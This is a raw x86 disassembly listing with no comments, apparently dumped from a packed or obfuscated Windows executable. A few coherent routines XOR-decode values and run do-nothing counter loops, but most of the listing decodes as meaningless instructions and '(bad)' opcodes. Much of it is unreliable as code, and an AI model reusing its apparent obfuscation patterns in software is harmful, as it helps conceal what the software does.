  40e4c4:	mov    ecx,DWORD PTR [ecx-0x3e]
  40e4c7:	push   edx
  40e4c8:	inc    esp
  40e4c9:	lea    eax,[edx+0x33]
  40e4cc:	mov    esp,0x8ba9ab52
  40e4d1:	(bad)  
  40e4d2:	ja     0x40e455
  40e4d4:	push   ss
  40e4d5:	dec    ebp
  40e4d6:	imul   ecx,eax,0xffffffd4
  40e4d9:	xchg   esi,eax
  40e4da:	jno    0x40e4c3
  40e4dc:	pop    ecx
  40e4dd:	inc    esp
  40e4de:	add    edi,esp
  40e4e0:	pop    es
  40e4e1:	nop
  40e4e2:	fadd   QWORD PTR [esi]
  40e4e4:	retf   0x90b8
  40e4e7:	jbe    0x40e515
  40e4e9:	hlt    
  40e4ea:	inc    esp
  40e4eb:	push   esp
  40e4ec:	jecxz  0x40e4b8
  40e4ee:	sub    eax,0x65e65325
  40e4f3:	leave  
  40e4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4f5:	retf   
  40e4f6:	aas    
  40e4f7:	push   0x79
  40e4f9:	sub    bh,BYTE PTR [esi]
  40e4fb:	(bad)  [eax-0x1e]
  40e4fe:	mov    al,0x22
  40e500:	or     al,0xf7
  40e502:	pusha  
  40e503:	push   eax
  40e504:	jmp    0x1892:0xc87661d4
  40e50b:	and    eax,0x6bb1e790
  40e510:	mov    ebx,0x24fab8cd
  40e515:	and    ebp,DWORD PTR [si-0x6846]
  40e51a:	push   ss
  40e51b:	push   ebx
  40e51c:	push   edx
  40e51d:	xor    eax,0x3bcc6b2d
  40e522:	jae    0x40e4f3
  40e524:	sbb    eax,0xae9c2a24
  40e529:	pusha  
  40e52a:	nop
  40e52b:	mov    bh,0x3a
  40e52d:	add    eax,0xad67109d
  40e532:	push   cs
  40e533:	xchg   ecx,eax
  40e534:	das    
  40e535:	pop    ss
  40e536:	daa    
  40e537:	xor    ebx,DWORD PTR [ebp-0x1e]
  40e53a:	push   ebx
  40e53b:	xor    cl,BYTE PTR [ebx+0xd81f445]
  40e541:	and    edi,DWORD PTR [eax]
  40e543:	inc    ebx
  40e544:	add    BYTE PTR [ebx+0x38],ch
  40e547:	inc    ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x43385b,0x43382f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x3bf261b8
  40e5b4:	mov    DWORD PTR ds:[ebp+0x2a],esi
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5d1
  40e5c0:	adc    ah,BYTE PTR [ebp+ebp*4+0x17]
  40e5c4:	(bad)  
  40e5c5:	sub    ch,BYTE PTR [ebp-0x7e]
  40e5c8:	arpl   WORD PTR [ecx+0x1b],bp
  40e5cb:	or     DWORD PTR [edx],ebp
  40e5cd:	and    BYTE PTR [edx+0x2e],ah
  40e5d0:	or     eax,0xaeb99655
  40e5d5:	cwde   
  40e5d6:	inc    ecx
  40e5d7:	pop    eax
  40e5d8:	inc    ebx
  40e5d9:	in     al,0x8
  40e5db:	nop
  40e5dc:	addr16 xchg esi,eax
  40e5de:	retf   
  40e5df:	sub    eax,0x8de7d70a
  40e5e4:	mov    ah,0x5b
  40e5e6:	test   BYTE PTR [edx+edi*8],dh
  40e5e9:	enter  0x7334,0xcb
  40e5ed:	cmp    BYTE PTR [edx-0x55],cl
  40e5f0:	sub    al,0x92
  40e5f2:	mov    ebp,DWORD PTR [esi+0x47ccb547]
  40e5f8:	jge    0x40e642
  40e5fa:	ret    
  40e5fb:	xchg   ecx,eax
  40e5fc:	fidivr DWORD PTR [esi]
  40e5fe:	dec    ebp
  40e5ff:	or     bh,BYTE PTR [edx]
  40e601:	add    eax,0x60be37af
  40e606:	push   ds
  40e607:	test   eax,0x36551a26
  40e60c:	add    al,BYTE PTR [esi-0x15]
  40e60f:	pop    ds
  40e610:	jne    0x40e66d
  40e612:	jge    0x40e5b8
  40e614:	add    DWORD PTR [esi],edx
  40e616:	popa   
  40e617:	sbb    al,0x65
  40e619:	bound  ebx,QWORD PTR [ecx-0x10]
  40e61c:	push   edx
  40e61d:	jge    0x40e5b8
  40e61f:	mov    ah,0xc3
  40e621:	scas   eax,DWORD PTR es:[edi]
  40e622:	cmp    BYTE PTR [ebx],al
  40e624:	xchg   ebp,eax
  40e625:	inc    esi
  40e626:	imul   ecx,DWORD PTR [esi],0xef6ac623
  40e62c:	aad    0x1a
  40e62e:	cs pop ebp
  40e630:	cmp    ch,BYTE PTR [ebx-0x46]
  40e633:	cmp    cl,ch
  40e635:	cmp    dl,bl
  40e637:	pop    ss
  40e638:	outs   dx,DWORD PTR ds:[esi]
  40e639:	sub    edx,DWORD PTR [ecx]
  40e63b:	ficomp DWORD PTR [eax-0x3b]
  40e63e:	bound  esi,QWORD PTR [ecx-0x3b]
  40e641:	ss jmp 0x930b:0xff63658a
  40e649:	je     0x40e6ab
  40e64b:	out    0xd2,eax
  40e64d:	mov    esi,0xa6cd236e
  40e652:	std    
  40e653:	popf   
  40e654:	cld    
  40e655:	repnz sub DWORD PTR [edi+0x7d],ebx
  40e659:	sbb    edi,DWORD PTR [ebx]
  40e65b:	mov    ds:0x324b365a,al
  40e660:	mov    ?,WORD PTR [eax-0x34]
  40e663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e664:	xchg   esp,eax
  40e665:	ds (bad) 
  40e667:	sub    BYTE PTR [edi-0x3391021e],dl
  40e66d:	clc    
  40e66e:	fidiv  WORD PTR [esi+0x32]
  40e671:	xchg   DWORD PTR [eax],edx
  40e673:	mov    ebx,0x694c004d
  40e678:	mov    gs,WORD PTR [eax+0x6e]
  40e67b:	mov    WORD PTR [edi],fs
  40e67d:	cld    
  40e67e:	mov    bh,0xab
  40e680:	mov    al,0x2d
  40e682:	call   0xca273417
  40e687:	sub    eax,0xf1b23d59
  40e68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e68d:	add    DWORD PTR [ebx-0x60],edi
  40e690:	(bad)  
  40e691:	aas    
  40e692:	fadd   st(2),st
  40e694:	push   edi
  40e695:	xchg   DWORD PTR [ebp-0x16c39e43],esi
  40e69b:	lea    edi,[esi+0x4d1ec39d]
  40e6a1:	and    al,0xe2
  40e6a3:	je     0x40e6d5
  40e6a5:	adc    ch,BYTE PTR ds:[edx+eax*4]
  40e6a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6aa:	sbb    DWORD PTR [ebx-0x27],0xcf890ca4
  40e6b1:	adc    BYTE PTR [ebp+0x746dee06],bl
  40e6b7:	aad    0x74
  40e6b9:	sar    ah,1
  40e6bb:	gs in  eax,dx
  40e6bd:	and    bh,0xe0
  40e6c0:	and    ebp,DWORD PTR [ecx]
  40e6c2:	xlat   BYTE PTR ds:[ebx]
  40e6c3:	(bad)  
  40e6c4:	cmp    BYTE PTR [ebx+0x2],ch
  40e6c7:	bound  esp,QWORD PTR [esi-0x6016756d]
  40e6cd:	icebp  
  40e6ce:	xchg   edi,eax
  40e6cf:	mov    ah,0x68
  40e6d1:	shl    BYTE PTR [eax-0x4b],1
  40e6d4:	add    ah,BYTE PTR [ebx+0x7]
  40e6d7:	(bad)  
  40e6d8:	jbe    0x40e706
  40e6da:	(bad)  
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x2a6d7267]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e762
  40e704:	xchg   BYTE PTR [esp+edx*2+0x3e097f8c],bh
  40e70b:	arpl   WORD PTR [ebp+0x79],dx
  40e70e:	push   cs
  40e70f:	mov    ah,0x54
  40e711:	jge    0x40e702
  40e713:	pop    esi
  40e714:	cmp    al,0xa7
  40e716:	mov    esi,0x23ab9303
  40e71b:	jo     0x40e75a
  40e71d:	ret    
  40e71e:	add    bl,ch
  40e720:	addr16 call 0x9639:0x3562acf4
  40e728:	sbb    DWORD PTR [eax],eax
  40e72a:	push   esp
  40e72b:	pop    edx
  40e72c:	retf   
  40e72d:	or     al,0x8f
  40e72f:	cmp    BYTE PTR [ebp+0x6a],ah
  40e732:	pop    ebp
  40e733:	xor    al,0x65
  40e735:	or     eax,0x452b6e0f
  40e73a:	movq   xmm5,QWORD PTR [ebp+0x5176c88]
  40e742:	adc    al,0x54
  40e744:	xchg   esi,eax
  40e745:	lods   eax,DWORD PTR ds:[esi]
  40e746:	loopne 0x40e7be
  40e748:	test   ebx,edi
  40e74a:	out    dx,eax
  40e74b:	cmp    DWORD PTR [edi],ebp
  40e74d:	push   ebp
  40e74e:	lahf   
  40e74f:	lock imul esi,DWORD PTR [eax+eax*2],0xf83d2da4
  40e757:	gs inc eax
  40e759:	xchg   ebx,eax
  40e75a:	push   ebp
  40e75c:	ja     0x40e742
  40e75e:	fldcw  WORD PTR [eax]
  40e760:	in     eax,dx
  40e761:	cmp    ch,al
  40e763:	retf   
  40e764:	or     DWORD PTR [ebx+0x1f],esp
  40e767:	sbb    eax,0x6e1f9557
  40e76c:	mov    al,ds:0x106fb467
  40e771:	dec    esp
  40e772:	push   edx
  40e773:	lods   eax,DWORD PTR ds:[esi]
  40e774:	lods   al,BYTE PTR ds:[esi]
  40e775:	inc    eax
  40e776:	and    ecx,ebx
  40e778:	adc    eax,0x82254000
  40e77d:	xchg   edx,eax
  40e77e:	lea    ecx,ss:[ebx+0x6413b7]
  40e785:	test   DWORD PTR [ecx],ebp
  40e787:	and    BYTE PTR [edx],ch
  40e789:	mov    esp,DWORD PTR [eax+0x75]
  40e78c:	mov    cl,BYTE PTR gs:[edx+0x25]
  40e790:	lahf   
  40e791:	(bad)
  40e795:	popa   
  40e796:	push   cs
  40e797:	data16 test al,0x25
  40e79a:	mov    ecx,0xd391465
  40e79f:	sti    
  40e7a0:	mov    ds:0x5569f98f,eax
  40e7a5:	aad    0xcb
  40e7a7:	sbb    BYTE PTR [esi+0x1c42af96],ch
  40e7ad:	enter  0xc20b,0x70
  40e7b1:	sub    BYTE PTR [eax],ch
  40e7b3:	or     eax,ebx
  40e7b5:	jp     0x40e7a8
  40e7b7:	xor    BYTE PTR [ebx-0x77],0x14
  40e7bb:	jbe    0x40e838
  40e7bd:	xor    dl,BYTE PTR cs:[ecx-0x7e]
  40e7c1:	jmp    0xc3f6:0xd058b660
  40e7c8:	lahf   
  40e7c9:	push   ebp
  40e7ca:	in     eax,0x85
  40e7cc:	push   edx
  40e7cd:	pushf  
  40e7ce:	dec    eax
  40e7cf:	and    bh,BYTE PTR [esi-0x5cd08b02]
  40e7d5:	sub    ebx,DWORD PTR [eax-0x10]
  40e7d8:	mov    cl,BYTE PTR [ebp-0x9392ceb]
  40e7de:	xchg   DWORD PTR [esp+esi*8+0x124eecff],edx
  40e7e5:	jge    0x40e7dc
  40e7e7:	jg     0x40e802
  40e7e9:	repz pop esp
  40e7eb:	add    eax,0x55ddcfe4
  40e7f0:	sti    
  40e7f1:	jmp    0x40e7a8
  40e7f3:	push   edx
  40e7f4:	dec    eax
  40e7f5:	fld    TBYTE PTR [edi+ebp*1+0x2765ab6f]
  40e7fc:	push   ebp
  40e7fd:	in     al,0xa9
  40e7ff:	dec    ecx
  40e800:	(bad)  
  40e801:	bound  edx,QWORD PTR ds:0x5c92fd33
  40e807:	lods   eax,DWORD PTR ds:[esi]
  40e808:	cmc    
  40e809:	sub    eax,0xbeba8956
  40e80e:	push   0x2
  40e810:	(bad)  
  40e811:	and    esp,DWORD PTR [edx+0x6a1b2c6]
  40e817:	jnp    0x40e883
  40e819:	and    al,0x65
  40e81b:	les    esi,FWORD PTR [ebp+eax*2-0x3ba76af]
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e88e
  40e854:	jmp    0x40e7fe
  40e856:	and    dl,0xa7
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e874
  40e860:	jo     0x40e83d
  40e862:	arpl   cx,cx
  40e864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e865:	(bad)  
  40e866:	adc    DWORD PTR [ebp-0x4c],esp
  40e869:	pop    ebp
  40e86a:	rcl    edx,cl
  40e86c:	adc    BYTE PTR [edi+0x790dafae],0x26
  40e873:	lods   eax,DWORD PTR ds:[esi]
  40e874:	xor    al,0x6
  40e876:	iret   
  40e877:	sub    DWORD PTR [ebp-0xfd01d0e],ebx
  40e87d:	jo     0x40e8b4
  40e87f:	pusha  
  40e880:	mov    ecx,0x65e5acfb
  40e886:	cwde   
  40e887:	stc    
  40e888:	out    dx,eax
  40e889:	jg     0x40e8c1
  40e88b:	fwait
  40e88c:	push   0x7867c364
  40e891:	mov    ds:0xf842630a,eax
  40e896:	push   edx
  40e897:	cmp    ecx,DWORD PTR [ebx+0x34c5c5da]
  40e89d:	cmp    DWORD PTR [ebx+0x13cf8e09],0x25
  40e8a4:	pop    edx
  40e8a5:	jnp    0x40e908
  40e8a7:	xchg   esp,eax
  40e8a8:	dec    edi
  40e8a9:	mov    DWORD PTR [edi],edx
  40e8ab:	out    0x1f,eax
  40e8ad:	retf   
  40e8ae:	cmp    BYTE PTR [edi-0x3],cl
  40e8b1:	mov    eax,eax
  40e8b3:	xor    esp,ebp
  40e8b5:	outs   dx,DWORD PTR ds:[esi]
  40e8b6:	nop
  40e8b7:	(bad)  
  40e8b8:	mov    dl,0xff
  40e8ba:	pop    ebx
  40e8bb:	mov    ds:0xf2b5ac23,al
  40e8c0:	or     DWORD PTR [edi-0x52a94b96],eax
  40e8c6:	test   ecx,ecx
  40e8c8:	xchg   esp,eax
  40e8c9:	clc    
  40e8ca:	pop    es
  40e8cb:	popf   
  40e8cc:	mov    dl,BYTE PTR [eax-0x932090a]
  40e8d2:	dec    BYTE PTR [esi-0x5d84f455]
  40e8d8:	pop    edi
  40e8d9:	or     edx,DWORD PTR [ebp+0x51]
  40e8dc:	popa   
  40e8dd:	test   eax,0x3ea7aac3
  40e8e2:	iret   
  40e8e3:	xchg   ebp,eax
  40e8e4:	adc    DWORD PTR [edx+0x6de815d3],ebp
  40e8ea:	(bad)  
  40e8ec:	push   edx
  40e8ed:	nop
  40e8ee:	cmp    DWORD PTR [esi],edx
  40e8f0:	mov    BYTE PTR [ecx-0x5f],dl
  40e8f3:	adc    DWORD PTR gs:[ecx-0x6b80b9d0],ebp
  40e8fa:	inc    edi
  40e8fb:	jmp    0xe3283fd9
  40e900:	(bad)  
  40e901:	js     0x40e922
  40e903:	mov    ebp,0x5071efc5
  40e908:	fldcw  WORD PTR [ecx-0x1160aa35]
  40e90e:	xchg   esp,eax
  40e90f:	cmp    BYTE PTR [ebp+0x2d],0xac
  40e913:	sub    ebp,DWORD PTR [eax+ecx*1]
  40e916:	cmp    DWORD PTR [ebx],esi
  40e918:	push   ecx
  40e919:	mov    cl,0xa8
  40e91b:	dec    ecx
  40e91c:	jb     0x40e962
  40e91e:	pushw  0xffb0
  40e921:	jecxz  0x40e952
  40e923:	mov    edx,0x9fb71abd
  40e928:	inc    edx
  40e929:	and    BYTE PTR [ecx+0x31370d7],0xf8
  40e930:	leave  
  40e931:	repnz mov DWORD PTR [esp+eiz*2-0x6af99579],esp
  40e939:	neg    BYTE PTR [eax+eax*1+0x2e4ba08f]
  40e940:	int3   
  40e941:	stos   BYTE PTR es:[edi],al
  40e942:	retf   
  40e943:	xchg   edi,eax
  40e944:	test   al,0xa7
  40e946:	enter  0xb006,0xb2
  40e94a:	clc    
  40e94b:	(bad)  
  40e94c:	(bad)  [ecx+eiz*4-0x24f6795c]
  40e953:	fwait
  40e954:	scas   al,BYTE PTR es:[edi]
  40e955:	mov    ch,0x4a
  40e957:	mov    ebx,0xed17c401
  40e95c:	stos   DWORD PTR es:[edi],eax
  40e95d:	add    eax,0x134f7f02
  40e962:	or     al,0x53
  40e964:	mov    ah,bh
  40e966:	lea    esi,[edx]
  40e968:	mov    dh,0x6e
  40e96a:	jnp    0x40e95f
  40e96c:	push   esi
  40e96d:	ja     0x40e8fc
  40e96f:	mov    ah,0x83
  40e971:	ds (bad) 
  40e973:	add    edx,ebx
  40e975:	inc    ecx
  40e976:	dec    edi
  40e977:	aam    0xda
  40e979:	les    ebx,FWORD PTR [ebp+0xf]
  40e97c:	test   DWORD PTR [esi],edi
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x61fa9f1d
  40e99c:	xor    eax,DWORD PTR [esi+0x127e7ea4]
  40e9a2:	jg     0x40ea22
  40e9a4:	jle    0x40e929
  40e9a6:	jle    0x40ea04
  40e9a8:	sbb    edx,DWORD PTR [ebx]
  40e9aa:	sbb    BYTE PTR [ecx],ah
  40e9ac:	xchg   edx,eax
  40e9ad:	and    cl,BYTE PTR [ecx+eax*2+0x38]
  40e9b1:	sub    cl,BYTE PTR [edi]
  40e9b3:	push   0x5664229
  40e9b8:	ins    DWORD PTR es:[edi],dx
  40e9b9:	jmp    0xb22186f0
  40e9be:	jae    0x40e9e1
  40e9c0:	enter  0x2268,0x7f
  40e9c4:	outs   dx,BYTE PTR ds:[esi]
  40e9c5:	mov    WORD PTR [edi-0x3c],?
  40e9c8:	dec    eax
  40e9c9:	inc    edi
  40e9ca:	or     dl,BYTE PTR [ecx+0x72]
  40e9cd:	mov    bh,0x86
  40e9cf:	inc    BYTE PTR [ebp-0x22b6998b]
  40e9d5:	fst    QWORD PTR [eax+0x2494a821]
  40e9db:	loopne 0x40e9b1
  40e9dd:	jo     0x40e9e1
  40e9df:	sub    eax,0x95c94996
  40e9e4:	inc    ecx
  40e9e5:	inc    esi
  40e9e6:	aad    0x6a
  40e9e8:	jo     0x40ea1c
  40e9ea:	mov    esi,0x887dc491
  40e9ef:	shr    esi,0x2e
  40e9f2:	mov    edi,0x7aa26337
  40e9f7:	sahf   
  40e9f8:	popf   
  40e9f9:	cmc    
  40e9fa:	cmp    BYTE PTR [edi+esi*2+0x1d],0x9c
  40e9ff:	xchg   BYTE PTR ss:[eax+0x74720d36],ah
  40ea06:	arpl   WORD PTR [esp+eiz*8-0x22df6e3b],cx
  40ea0d:	les    ebp,FWORD PTR [ebx-0x2d]
  40ea10:	add    edi,DWORD PTR [ecx]
  40ea12:	test   BYTE PTR [esi+0x2],ah
  40ea15:	dec    esp
  40ea16:	push   ss
  40ea17:	pusha  
  40ea18:	add    BYTE PTR [edx],bl
  40ea1a:	cwde   
  40ea1b:	out    0xe9,al
  40ea1d:	sbb    DWORD PTR [edx-0x22],0xffffffd5
  40ea21:	inc    edi
  40ea22:	out    dx,al
  40ea23:	jl     0x40ea03
  40ea25:	aam    0xf8
  40ea27:	scas   al,BYTE PTR es:[edi]
  40ea28:	gs daa 
  40ea2a:	or     ah,BYTE PTR [esi-0x48]
  40ea2d:	add    BYTE PTR [esi+eax*2+0x21],ah
  40ea31:	dec    esi
  40ea32:	test   BYTE PTR [ecx+edx*2+0x45],bl
  40ea36:	inc    esp
  40ea37:	sbb    DWORD PTR [edx],ebx
  40ea39:	out    dx,eax
  40ea3a:	push   0x10
  40ea3c:	push   ss
  40ea3d:	sub    ah,0xdd
  40ea40:	and    bh,dl
  40ea42:	xchg   ebx,eax
  40ea43:	xchg   ebp,eax
  40ea44:	in     eax,0x8
  40ea46:	mov    edi,0xbb7cb7c0
  40ea4b:	adc    ecx,ecx
  40ea4d:	lock and DWORD PTR [eax-0x78a995da],esp
  40ea54:	int    0xa1
  40ea56:	xchg   BYTE PTR [ecx],dl
  40ea58:	xor    eax,0x90ec6b93
  40ea5d:	ja     0x40e9e0
  40ea5f:	mov    edi,0x1e9e5b91
  40ea64:	call   0x529c07d9
  40ea69:	sti    
  40ea6a:	pushf  
  40ea6b:	pop    ecx
  40ea6c:	ins    BYTE PTR es:[edi],dx
  40ea6d:	mov    eax,0x488061e4
  40ea72:	aas    
  40ea73:	lock daa 
  40ea75:	les    ebx,FWORD PTR [ebx]
  40ea77:	cmp    ebp,0x4d
  40ea7a:	shl    eax,1
  40ea7c:	lods   al,BYTE PTR ds:[esi]
  40ea7d:	out    dx,al
  40ea7e:	test   eax,0x72f1b187
  40ea83:	das    
  40ea84:	mov    dh,0x49
  40ea86:	fimul  DWORD PTR [edi+0x64]
  40ea89:	mov    ebp,0x86fcbe14
  40ea8e:	pop    esi
  40ea8f:	mov    eax,0xda7a2114
  40ea94:	jne    0x40ea84
  40ea96:	sbb    ebx,DWORD PTR [esi]
  40ea98:	push   esi
  40ea99:	aam    0x92
  40ea9b:	push   ss
  40ea9c:	sbb    edi,DWORD PTR [edi]
  40ea9e:	dec    ecx
  40ea9f:	mov    bh,0xfb
  40eaa1:	add    ah,BYTE PTR [ebx+0x44f8bf04]
  40eaa7:	xchg   ebx,eax
  40eaa8:	push   ecx
  40eaa9:	enter  0x34ac,0x69
  40eaad:	dec    eax
  40eaae:	mov    bl,0xea
  40eab0:	sbb    bl,BYTE PTR [edi]
  40eab2:	adc    bh,ch
  40eab4:	(bad)  [edx]
  40eab6:	rep ins DWORD PTR es:[edi],dx
  40eab8:	push   0x1d
  40eaba:	es pop es
  40eabc:	mov    edx,esi
  40eabe:	xlat   BYTE PTR ds:[ebx]
  40eabf:	xor    BYTE PTR [esi+0x3],al
  40eac2:	ret    
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433813,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433813,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433813,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433813,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433813
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433813,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433813
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433813,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433853,0x16
  40eb34:	cmp    DWORD PTR ds:0x433853,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433853,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433853
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433853,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433863,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43381b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4338ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ah,bl
  40ebb4:	pop    ecx
  40ebb5:	mov    ebp,0x7ea59a0a
  40ebba:	jle    0x40ec10
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb8f
  40ebc0:	lods   eax,DWORD PTR ds:[esi]
  40ebc1:	dec    ebp
  40ebc2:	sbb    ecx,esi
  40ebc4:	fadd   DWORD PTR [ebx-0x1f]
  40ebc7:	mov    fs,edx
  40ebc9:	(bad)  
  40ebca:	and    DWORD PTR [edx+0x1d781b0f],esi
  40ebd0:	push   es
  40ebd1:	jmp    0xe961:0xbd5d7dda
  40ebd8:	jnp    0x40eb71
  40ebda:	xor    edi,DWORD PTR [eax+ebx*2]
  40ebdd:	mov    eax,ds:0x4004cd2
  40ebe2:	mov    ebp,0x2be94c2f
  40ebe7:	add    edx,eax
  40ebe9:	fmul   DWORD PTR [edi+edx*4-0x52]
  40ebed:	ss push edi
  40ebef:	aam    0x51
  40ebf1:	repnz fwait
  40ebf3:	mov    esp,0x3fbcc830
  40ebf8:	xor    edi,DWORD PTR [ecx]
  40ebfa:	sub    esi,ebp
  40ebfc:	push   cs
  40ebfd:	mov    dh,dl
  40ebff:	movzx  edi,WORD PTR [eax]
  40ec02:	lock cdq 
  40ec04:	das    
  40ec05:	mov    eax,ds:0x702ed702
  40ec0a:	arpl   WORD PTR [ebx+esi*8-0x4eb86cf6],di
  40ec11:	or     BYTE PTR [ebp+0x26],al
  40ec14:	add    BYTE PTR [edi],dl
  40ec16:	xchg   DWORD PTR [esi],eax
  40ec18:	push   edx
  40ec19:	test   eax,0xc6d86817
  40ec1e:	icebp  
  40ec1f:	icebp  
  40ec20:	retf   0xdc78
  40ec23:	sbb    BYTE PTR [eax],0x4f
  40ec26:	ins    BYTE PTR es:[edi],dx
  40ec27:	push   eax
  40ec28:	cdq    
  40ec29:	inc    esi
  40ec2a:	outs   dx,BYTE PTR ds:[esi]
  40ec2b:	sbb    eax,0xfd58e96c
  40ec30:	lods   eax,DWORD PTR ds:[esi]
  40ec31:	mov    al,0x90
  40ec33:	sbb    al,BYTE PTR [esi]
  40ec35:	icebp  
  40ec36:	dec    ebp
  40ec37:	sbb    ebp,DWORD PTR [esi+ebp*8+0x5f58bbd9]
  40ec3e:	add    esi,DWORD PTR [ebx+esi*4-0x6c]
  40ec42:	dec    ebp
  40ec43:	push   0x4f
  40ec45:	aaa    
  40ec46:	cmp    eax,0x1e2b78c2
  40ec4b:	std    
  40ec4c:	or     al,0xbf
  40ec4e:	jg     0x40ebfe
  40ec50:	sub    edx,DWORD PTR [ebx+0x632eddcd]
  40ec56:	icebp  
  40ec57:	les    esi,FWORD PTR ds:0xabc5617f
  40ec5d:	je     0x40ecaf
  40ec5f:	pop    ebx
  40ec60:	dec    esp
  40ec61:	inc    esp
  40ec62:	adc    eax,0xbc84835
  40ec67:	jb     0x40ec43
  40ec69:	jp     0x40ec4f
  40ec6b:	mov    ch,0xbf
  40ec6d:	jne    0x40ece1
  40ec6f:	jno    0x40ec00
  40ec71:	mov    ds:0xa36d3873,al
  40ec76:	inc    edi
  40ec77:	sahf   
  40ec78:	sbb    BYTE PTR [esi+0x31],ah
  40ec7b:	repz aas 
  40ec7d:	rol    edx,1
  40ec7f:	dec    edx
  40ec80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec81:	stos   BYTE PTR es:[edi],al
  40ec82:	rcr    BYTE PTR ds:0x67ab08ca,cl
  40ec88:	pop    ss
  40ec89:	pop    es
  40ec8a:	cmp    al,0x5d
  40ec8c:	es call 0x39b6:0x7219d6a9
  40ec94:	pop    edx
